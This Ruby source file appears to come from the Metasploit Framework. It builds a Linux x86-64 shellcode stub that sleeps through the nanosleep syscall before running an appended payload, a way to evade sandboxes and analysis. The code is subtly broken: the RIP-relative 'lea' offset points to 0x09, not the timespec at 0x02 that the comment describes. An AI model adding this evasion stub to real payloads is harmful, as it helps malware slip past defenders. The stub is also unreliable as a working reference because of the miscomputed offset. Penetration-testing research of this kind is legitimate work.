module Msf::Payload::Linux::X64::SleepEvasion

    STUB_SLEEP_SECONDS_OFFSET = 0x02

    def sleep_stub
      stub = ""

      # 0x00: jmp 0x12                   ; jump forward to code (skip data section)
      stub << [0xeb, 0x10].pack('C*')
      # 0x02: timespec.tv_sec (8 bytes)  ; sleep duration in seconds (patched later)
      stub << "\x00\x00\x00\x00\x00\x00\x00\x00"
      # 0x0a: timespec.tv_nsec (8 bytes) ; nanoseconds component (always 0)
      stub << "\x00\x00\x00\x00\x00\x00\x00\x00"
      # 0x12: lea rdi, [rip-0x10]        ; rdi -> timespec structure (RIP-relative addressing)
      stub << [0x48, 0x8d, 0x3d, 0xf0, 0xff, 0xff, 0xff].pack('C*')
      # 0x19: xor rsi, rsi               ; rsi = NULL (remaining time pointer)
      stub << [0x48, 0x31, 0xf6].pack('C*')
      # 0x1c: mov rax, 35                ; syscall number for nanosleep (0x23)
      stub << [0x48, 0xc7, 0xc0, 0x23, 0x00, 0x00, 0x00].pack('C*')
      # 0x23: syscall                    ; invoke syscall
      stub << [0x0f, 0x05].pack('C*')
      # 0x25: execution continues to appended payload

      stub
    end

    def sleep_evasion(opts = {})
      seconds = opts[:seconds] || 0
      return "" if seconds == 0

      stub = sleep_stub.dup
      stub[STUB_SLEEP_SECONDS_OFFSET, 8] = [seconds].pack('Q<')
      stub
    end

    def sleep_stub_size
      37
    end

end
